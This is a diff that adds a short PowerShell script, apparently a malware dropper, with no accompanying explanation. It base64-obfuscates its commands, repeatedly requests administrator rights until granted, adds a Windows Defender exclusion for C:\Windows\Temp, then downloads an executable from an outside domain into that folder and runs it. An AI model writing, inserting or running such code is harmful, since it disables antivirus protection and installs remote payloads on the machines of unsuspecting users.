@@ -1,0 +1,35 @@
+function RG {
+    while ($true) {
+        $encodedCmd = "QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcV2luZG93c1xUZW1wJw=="
+        $decodedCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCmd))
+
+        $p = Start-Process -FilePath "powershell.exe" `
+            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `$ErrorActionPreference='Stop'; $decodedCmd" `
+            -Verb RunAs `
+            -PassThru
+
+        $p.WaitForExit()
+
+        if ($p.ExitCode -eq 0) {
+            Start-Sleep -Seconds 5
+            CG
+            break
+        }
+    }
+}
+
+function CG {
+
+    $encodedURL = "aHR0cDovL2NhcGZvcmJlaW4uY29tL2d0cm45NzUvYnJ5amYuZXhl"
+    $encodedPath = "QzpcV2luZG93c1xUZW1wXFJlZGl4LmV4ZQ=="
+    $headers = @{ "T" = "K9xPlv" }
+
+    $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedURL))
+    $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPath))
+
+    Invoke-WebRequest -Uri $url -Headers $headers -OutFile $path
+    Start-Process -FilePath $path
+}
+
+
+RG
